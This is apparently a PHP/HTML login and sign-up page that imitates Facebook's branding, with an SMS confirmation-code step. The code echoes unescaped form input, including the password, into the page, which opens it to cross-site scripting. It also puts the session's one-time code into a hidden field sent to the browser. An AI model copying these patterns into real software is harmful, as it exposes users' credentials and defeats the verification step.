<?php
  include_once 'php/login.php';
  include_once 'php/register.php';
  // include_once 'php/verify_otp.php';
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <?php require 'php/link.php' ?>
    <link rel="stylesheet" href="css/login.css" />
    <title>Facebook - log in or sign up</title>
  </head>
  <body>
    <!-- Display the alert message if it's not empty -->
    <div class="toast-container position-fixed bottom-0 end-0 p-3">
      <div id="successOTPMessage" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-delay="3000">
        <div class="toast-header">
          <img src="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" class="rounded me-2" alt="...">
          <strong class="me-auto">Facebook</strong>
          <small>Now</small>
          <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
        </div>
        <div class="toast-body">
          <?php echo $OTPMessage; ?>
        </div>
      </div>
    </div>
    <!-- OTPMessage PHP -->
    <?php if (!empty($OTPMessage)) : ?>
      <script>
        // JavaScript to trigger the toast when needed
        function OTPMessage() {
          var successToast = new bootstrap.Toast(document.getElementById('successOTPMessage'));
          setTimeout(() => {
            $('#verifyCodeModal').modal('show');
            successToast.show();
          }, 100);
        }
        OTPMessage();
      </script>
    <?php endif; ?>

    <!-- OTPAlertMessage HTML -->
    <div class="toast-container position-fixed bottom-0 end-0 p-3">
      <div id="successToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-delay="3000">
        <div class="toast-header">
          <img src="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" class="rounded me-2" alt="...">
          <strong class="me-auto">Facebook</strong>
          <small>Now</small>
          <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
        </div>
        <div class="toast-body">
          <?php echo $OTPAlertMessage; ?>
        </div>
      </div>
    </div>

    <!-- OTPAlertMessage PHP -->
    <?php if (!empty($OTPAlertMessage)) : ?>
      <script>
        // JavaScript to trigger the toast when needed
        function showToast() {
          var successToast = new bootstrap.Toast(document.getElementById('successToast'));
          setTimeout(() => {
            $('#verifyCodeModal').modal('show');
            successToast.show();
          }, 100);
        }
        showToast();
      </script>
    <?php endif; ?>


    <?php if (!empty($alertMessage)) : ?>
      <script>
        alert("<?php echo $alertMessage; ?>");
        window.location.href = "index.php"; // Redirect to the index page
      </script>
    <?php endif; ?>

    <section class="container" id="container">
      <div class="container-left text-center">
        <div class="d-flex align-items-center justify-content-center">
          <img
            class=""
            style="width: 350px"
            src="https://static.xx.fbcdn.net/rsrc.php/yI/r/4aAhOWlwaXf.svg"
            alt="Facebook"
          />
        </div>
        <p class="text-gray-500 fs-2">
          Facebook helps you connect and share with the people in your life.
        </p>
      </div>

      <div class="container-right">
        <form class="px-4 py-4" method="POST">
          <!-- Error message -->
          <?php if (!empty($error)): ?>
            <div class="alert alert-danger"><?php echo $error; ?></div>
          <?php endif; ?>

          <!-- email -->
          <div class="mb-4">
            <input
              type="text"
              name="emailOrPhone"
              class="form-control"
              style="padding: 15px"
              id="emailOrPhone"
              aria-describedby="emailHelp"
              placeholder="Email address or Phone number"
            />
          </div>

          <!-- password -->
          <div class="input-group mb-3">
            <input
              type="password"
              name="password"
              class="form-control"
              style="padding: 15px"
              id="PasswordLogin"
              placeholder="Password"
            />
            <button class="btn btn-outline-secondary" type="button" id="togglePassword" style="border-radius: 0px 5px 5px 0px">
              <i class="fa fa-eye-slash" aria-hidden="true"></i>
            </button>
          </div>

          <!-- login btn -->
          <button
            type="submit"
            name="login"
            id="loginButton"
            class="btn btn-primary col-12 mx-auto fw-bold"
            style="font-size: 18px; padding: 10px 20px 10px 20px"
          >
            Log in
          </button>

          <!-- forgot password -->
          <div class="text-center pt-3 Forgotten">
            <a href="./html/fogotpassword/fogotpassword.php" class="text-center mt-3">Forgotten password?</a>
          </div>
          <hr />

          <!-- create new account -->
          <div class="text-center">
            <button
              type="button"
              class="btn btn-success fw-bold"
              style="padding: 10px 20px 10px 20px; font-size: 18px"
              data-bs-toggle="modal"
              data-bs-target="#signup"
              data-bs-whatever="@mdo"
            >
              Create new account
            </button>
          </div>
        </form>

        <!-- create page -->
        <div class="text-center mt-3">
          <p>
            <a href="html/404/notFound.php" style="text-decoration: none" class="fw-bold text-dark"
              >Create a Page</a
            >
            for a celebrity, brand or business.
          </p>
        </div>
      </div>
    </section>


    <!-- sign up -->
    <div class="modal fade" id="signup" aria-hidden="true" aria-labelledby="exampleModalLabel1" tabindex="-1">
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
          <div class="modal-header">
            <h1 class="modal-title fs-5" id="exampleModalLabel1">
              Sign Up<br /><span
                style="font-size: medium"
                class="text-secondary fw-normal"
                >It's quick and easy.</span
              >
            </h1>
            <button
              type="button"
              class="btn-close"
              data-bs-dismiss="modal"
              aria-label="Close"
            ></button>
          </div>

          <!-- form sign up -->
          <div class="modal-body">
            <form method="POST">
              <div class="d-flex col-12 mb-2">

                <!-- firs name -->
                <div class="pe-1 col-6">
                  <input
                    type="text"
                    class="form-control"
                    id="first_name"
                    name="first_name"
                    placeholder="First name"
                    value="<?php echo isset($_POST['first_name']) ? $_POST['first_name'] : ''; ?>"
                  />
                </div>

                <!-- surname -->
                <div class="ps-1 col-6">
                  <input
                    type="text"
                    class="form-control"
                    id="surname"
                    name="surname"
                    placeholder="Surname"
                    value="<?php echo isset($_POST['surname']) ? $_POST['surname'] : ''; ?>"
                  />
                </div>
              </div>

              <!-- email -->
              <div class="mb-2">
                <input
                  type="text"
                  class="form-control"
                  id="mobileOrEmail_register"
                  name="mobileOrEmail"
                  placeholder="Mobile number or email address"
                  value="<?php echo isset($_POST['mobileOrEmail']) ? $_POST['mobileOrEmail'] : ''; ?>"
                />
              </div>

              <!-- password -->
              <div class="input-group mb-2">
                <input
                  type="password"
                  class="form-control"
                  id="password_register"
                  name="password"
                  placeholder="New password"
                  value="<?php echo isset($_POST['password']) ? $_POST['password'] : ''; ?>"
                />
                <button class="btn btn-outline-secondary" type="button" id="togglePasswordRegister" style="border-radius: 0px 5px 5px 0px">
                  <i class="fa fa-eye-slash" aria-hidden="true"></i>
                </button>
              </div>

              <!-- date of birth -->
              <div class="mb-2">
                <div class="d-flex align-items-center gap-1">
                    <label for="">Date of birth </label>
                    <svg xmlns="http://www.w3.org/2000/svg" height="0.8em" viewBox="0 0 320 512"><!--! Font Awesome Free 6.4.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. --><path d="M80 160c0-35.3 28.7-64 64-64h32c35.3 0 64 28.7 64 64v3.6c0 21.8-11.1 42.1-29.4 53.8l-42.2 27.1c-25.2 16.2-40.4 44.1-40.4 74V320c0 17.7 14.3 32 32 32s32-14.3 32-32v-1.4c0-8.2 4.2-15.8 11-20.2l42.2-27.1c36.6-23.6 58.8-64.1 58.8-107.7V160c0-70.7-57.3-128-128-128H144C73.3 32 16 89.3 16 160c0 17.7 14.3 32 32 32s32-14.3 32-32zm80 320a40 40 0 1 0 0-80 40 40 0 1 0 0 80z"/></svg>
                </div>
                <div class="d-flex gap-2 mt-1">
                  <!-- Day -->
                  <select
                    aria-label="Day"
                    name="birthday_day"
                    id="day"
                    title="Day"
                    class="form-select"
                    value="<?php echo isset($_POST['birthday_day']) ? $_POST['birthday_day'] : ''; ?>"
                    >
                    <?php
                      // Loop through the days from 1 to 31
                      for ($day = 1; $day <= 31; $day++) {
                        // Check if the day matches the selected day (from user data)
                        $selected = (isset($_POST['birthday_day']) && $_POST['birthday_day'] == $day) ? 'selected' : '';
                        echo "<option value=\"$day\" $selected>$day</option>";
                      }
                    ?>
                  </select>

                  <!-- month -->
                  <select
                    aria-label="Month"
                    name="birthday_month"
                    id="month"
                    title="Month"
                    class="form-select"
                    value="<?php echo isset($_POST['birthday_month']) ? $_POST['birthday_month'] : ''; ?>"
                    >
                    <?php
                      // An array of month names
                      $monthNames = [
                        1 => 'Jan', 2 => 'Feb', 3 => 'Mar', 4 => 'Apr', 5 => 'May', 6 => 'Jun',
                        7 => 'Jul', 8 => 'Aug', 9 => 'Sep', 10 => 'Oct', 11 => 'Nov', 12 => 'Dec'
                      ];

                      // Loop through the months
                      foreach ($monthNames as $monthNumber => $monthName) {
                        // Check if the month matches the selected month (from user data)
                        $selected = (isset($_POST['birthday_month']) && $_POST['birthday_month'] == $monthNumber) ? 'selected' : '';
                        echo "<option value=\"$monthNumber\" $selected>$monthName</option>";
                      }
                    ?>
                  </select>

                  <!-- year -->
                  <select
                      aria-label="Year"
                      name="birthday_year"
                      class="form-select"
                      id="year"
                      title="Year"
                      value="<?php echo isset($_POST['birthday_year']) ? $_POST['birthday_year'] : ''; ?>"
                      >
                      <?php
                        // Set the range of years you want to display
                        $startYear = 1900;
                        $endYear = date('Y');

                        // Loop through the years in reverse order
                        for ($year = $endYear; $year >= $startYear; $year--) {
                          // Check if the year matches the selected year (from user data)
                          $selected = (isset($_POST['birthday_year']) && $_POST['birthday_year'] == $year) ? 'selected' : '';
                          echo "<option value=\"$year\" $selected>$year</option>";
                        }
                      ?>
                  </select>
                </div>
              </div>

              <!-- gender -->
              <div class="">
                <label for="">Gender </label>
                <div class="d-flex gap-2 mt-1">
                  <div class="form-check form-control" >
                    <div class="" style="display: flex;justify-content: space-between;">
                      <div class="">
                        <label class="form-check-label" for="female">Female</label>
                      </div>
                      <div class="">
                        <input
                          type="radio"
                          class="form-check-input"
                          name="gender"
                          value="1"
                          id="female"
                          <?php
                            // Check if the user's gender is Female
                            $selectedFemale = (isset($_POST['gender']) && $_POST['gender'] == 1) ? 'checked' : '';
                            echo $selectedFemale;
                          ?>
                        />
                      </div>
                    </div>
                  </div>
                  <div class="form-check form-control">
                    <div class="" style="display: flex;justify-content: space-between;">
                      <div class="">
                        <label class="form-check-label" for="male">Male</label>
                      </div>
                      <div class="">
                        <input
                          type="radio"
                          class="form-check-input "
                          name="gender"
                          value="2"
                          id="male"
                          <?php
                            // Check if the user's gender is Male
                            $selectedMale = (isset($_POST['gender']) && $_POST['gender'] == 2) ? 'checked' : '';
                            echo $selectedMale;
                          ?>
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <!-- more information -->
              <div class="mt-2 text-secondary" style="font-size: 13px;">
                <p >People who use our service may have uploaded your contact information to Facebook. Learn more.</p>
              </div>
              <div class="text-secondary" style="font-size: 13px;">
                <p>By clicking Sign Up, you agree to our Terms, Privacy Policy and Cookies Policy. You may receive SMS notifications from us and can opt out at any time.</p>
              </div>

              <!-- submit button -->
              <div class="text-center mb-3">
                <button type="submit" name="sing_up" id="sing_upBtn" class="btn btn-success fw-bold" style="padding: 7px 30px 7px 30px;">Sign up</button>
              </div>

            </form>

          </div>
        </div>
      </div>
    </div>


    <!-- verify OTP-->
    <div class="modal fade" id="verifyCodeModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
          <div class="modal-header">
            <h1 class="modal-title fs-4" id="exampleModalLabel">Enter the confirmation code from the text message</h1>
          </div>
          <div class="modal-body">
            <form method="POST">
              <div class="mb-3">
                <label for="" class="col-form-label">Let us if this mobile number belongs to you. Enter the code in the SMS sent to :</label>
                <div class="input-group mt-2">
                  <span class="input-group-text">FB- </span>
                  <input type="hidden" name="first_name" value="<?php echo isset($_POST['first_name']) ? $_POST['first_name'] : ''; ?>"/>
                  <input type="hidden" name="surname" value="<?php echo isset($_POST['surname']) ? $_POST['surname'] : ''; ?>"/>
                  <input type="hidden" name="mobileOrEmail" value="<?php echo isset($_POST['mobileOrEmail']) ? $_POST['mobileOrEmail'] : ''; ?>"/>
                  <input type="hidden" name="password" value="<?php echo isset($_POST['password']) ? $_POST['password'] : ''; ?>"/>
                  <input type="hidden" name="birthday_day" value="<?php echo isset($_POST['birthday_day']) ? $_POST['birthday_day'] : ''; ?>"/>
                  <input type="hidden" name="birthday_month" value="<?php echo isset($_POST['birthday_month']) ? $_POST['birthday_month'] : ''; ?>"/>
                  <input type="hidden"name="birthday_year" value="<?php echo isset($_POST['birthday_year']) ? $_POST['birthday_year'] : ''; ?>"/>
                  <input type="hidden" name="OTP_CODE" value="<?php echo $_SESSION['CODE_OTP']?>" />
                  <input type="radio" class="d-none" name="gender" value="1"
                    <?php
                      // Check if the user's gender is Female
                      $selectedFemale = (isset($_POST['gender']) && $_POST['gender'] == 1) ? 'checked' : '';
                      echo $selectedFemale;
                    ?>
                  />
                  <input type="radio" class="d-none" name="gender" value="2"
                    <?php
                      // Check if the user's gender is Male
                      $selectedMale = (isset($_POST['gender']) && $_POST['gender'] == 2) ? 'checked' : '';
                      echo $selectedMale;
                    ?>
                  />
                  <input type="text" class="form-control" name="verify_code" id="verify_code" value="">
                </div>
              </div>
              <div class="mb-3">
                <a href="#" class="text-primary" style="cursor: pointer;text-decoration: none;" id="sentAgain">Sent SMS Again</a>
              </div>
              <div class="modal-footer">
                <button type="button" class="btn btn-secondary" id="showModalSignup">Back</button>
                <button type="submit" name="Continue" id="Continue" class="btn btn-primary">Continue</button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>



    <!-- =================JS FILE================== -->
    <script src="js/checkLogin.js?<?php echo time();?>" type="text/javascript"></script>
    <script src="js/checkRegister.js?<?php echo time();?>" type="text/javascript"></script>
    <script src="js/OTPCode.js?<?php echo time();?>" type="text/javascript"></script>
  </body>
</html>
